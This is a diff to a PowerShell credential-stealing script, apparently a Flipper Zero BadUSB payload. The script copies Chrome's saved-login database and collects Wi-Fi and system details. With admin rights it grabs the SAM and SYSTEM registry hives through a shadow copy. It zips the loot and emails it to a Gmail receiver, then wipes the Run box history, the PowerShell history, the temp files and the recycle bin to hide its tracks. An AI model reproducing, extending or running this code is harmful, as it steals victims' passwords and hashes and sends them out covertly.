@@ -1,17 +1,28 @@
-<# Editable paramaters #>
+param($emailPassword, $isDebug = $false, $zip = $true)
+
+<# Editable data - only edit the data below #>
 $SMTPServer = 'smtp.gmail.com'
 $emailSmtpUser = "FlipperZero.Sender@gmail.com"
 $emailTo = "flipperzero.receiver@gmail.com"
-<# End of editable paramaters #>
+<# End of editable data #>
+
+
+<# Param checking #>
+if ([string]::IsNullOrEmpty($emailPassword)) {
+	Write-Error "No 'emailPassword' param provided. Exiting..."
+	Exit
+}
+<# End of Param checking #>
+
 
 <# Running code - do not edit the below #>
-$emailSmtpPass = $args[0]
-$useDebugFiles = $args[1]
+$isRunningAsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);
+
 $tempFolder = "$env:TEMP\GrabberOutput"
 
 # Allow using a debug output location for testing
-if ($useDebugFiles -eq "true") {
-	$baseFolder = "C:\Users\$env:UserName\Desktop\TestOutput"
+if ($isDebug -eq $true) {
+	$baseFolder = "C:\Users\$env:UserName\Desktop\Test Output"
 } else {
 	$baseFolder = $tempFolder
 }
@@ -25,16 +36,18 @@ if (Test-Path -Path $baseFolder) {
 
 
 <# Grabbing the various data #>
-$generalDetailsFilePath = "$baseFolder\GeneralDetails.txt"
 
 # Copy chrome data into a local file
-$chromeDataFilePath = "$baseFolder\Chrome_Data.txt"
-Copy-Item "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data" $chromeDataFilePath
+function Grab-Chrome-Data() {
+	$chromeDataFilePath = "$baseFolder\Chrome_Data.txt"
+	Copy-Item "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data" $chromeDataFilePath
+}
+Grab-Chrome-Data
 
 # Grab the available Wifi details
-$wifiFilePath = "$baseFolder\Wifi.txt"
+function Grab-Wifi-Details {	
+	$wifiFilePath = "$baseFolder\Wifi.txt"
 
-function Grab-Wifi-Details {
 	# Get Network Interfaces
 	$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
 
@@ -92,8 +105,6 @@ function Get-Name($userName) {
 
 
 <# Create the report #>
-$reportFilePath = "$baseFolder\ComputerInfo.html"
-
 function Get-Days-Since-Password-Last-Set {
     try {
 		$pls = net user $env:USERNAME | Select-String -Pattern "Password last" ; $pls = [string]$pls
@@ -170,6 +181,8 @@ function Add-User-Details([ref]$body, $userName) {
 }
 
 function Create-Report {
+	$reportFilePath = "$baseFolder\ComputerInfo.html"
+
 	$date = get-date 
 	$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
 	$body = $body + "<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>" 
@@ -229,16 +242,58 @@ function Create-Report {
 }
 Create-Report
 
+function Try-Grab-Sam-File() {
+	if ($isRunningAsAdmin -eq $true) {
+		echo "IsAdmin"
+		$samFilePath = "$baseFolder\SAM.txt"
+		$systemFilePath = "$baseFolder\SYSTEM.txt"
+
+		#<# TODO: Fix and enable
+		$createShadow = (gwmi -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible')
+		$shadow = gwmi Win32_ShadowCopy | ? { $_.ID -eq $createShadow.ShadowID } 
+		$addSlash  = $shadow.DeviceObject + '\' 
+		cmd /c mklink C:\shadowcopy $addSlash
+		Copy-Item 'C:\shadowcopy\Windows\System32\config\SAM' $samFilePath
+		Copy-Item 'C:\shadowcopy\Windows\System32\config\SYSTEM' $systemFilePath
+		Remove-Item -force 'C:\shadowcopy'
+	}
+}
+Try-Grab-Sam-File
+
+
+<# !!!!!!!!!! Zip up the email if needed !!!!!!!!! #>
+# Clear existing zip file first irrelevant of whether we do zip or not
+$zipFileName = "$baseFolder\Data.zip"
+if (Test-Path -Path $zipFileName) {
+	Remove-Item -force $zipFileName
+}
+
+$attachments = @()
+$files = Get-ChildItem -Path $baseFolder -Include * -File -Recurse
+foreach ($file in $files) {
+	$fileName = $file.Name
+	$attachments += "$baseFolder\$fileName"
+}
+echo $attachments
+
+if ($zip -eq $true) {
+	$compress = @{
+		LiteralPath= $attachments
+		CompressionLevel = "Optimal"
+		DestinationPath = $zipFileName
+	}
+	Compress-Archive @compress
+	$attachments = $zipFileName
+} 
 
 <# !!!!!!!!!! Send the email !!!!!!!!! #>
-
-# Send the email with attachements
-$sstr = ConvertTo-SecureString -string $emailSmtpPass -AsPlainText -Force
+# Send the email with attachments
+$sstr = ConvertTo-SecureString -string $emailPassword -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential -argumentlist $emailSmtpUser, $sstr
 $fullName = Get-Name $env:UserName
 $subject = "$fullName ($env:UserName)"
 
-Send-MailMessage -From $emailSmtpUser -To $emailTo -Subject $subject -Body "Data test" -Attachments $chromeDataFilePath, $wifiFilePath, $reportFilePath -SmtpServer $SMTPServer -UseSSL -Credential $cred -Port 587
+Send-MailMessage -From $emailSmtpUser -To $emailTo -Subject $subject -Body "Data test" -Attachments $attachments -SmtpServer $SMTPServer -UseSSL -Credential $cred -Port 587
 
 
 
@@ -246,14 +301,17 @@ Send-MailMessage -From $emailSmtpUser -To $emailTo -Subject $subject -Body "Data
 # Delete contents of Temp folder (intentionally not using baseFolder so we can debug as needed)
 rm $tempFolder\* -r -Force -ErrorAction SilentlyContinue
 if (Test-Path -Path $tempFolder) {
-	Remove-Item $tempFolder
+	Remove-Item -force $tempFolder
 }
 
 # Delete run box history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
-Remove-Item (Get-PSreadlineOption).HistorySavePath
+$powerShellHistoryFilePath = (Get-PSreadlineOption).HistorySavePath
+if (Test-Path -Path $powerShellHistoryFilePath) {
+	Remove-Item -force $powerShellHistoryFilePath
+}
 
 # Delete contents of recycle bin
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
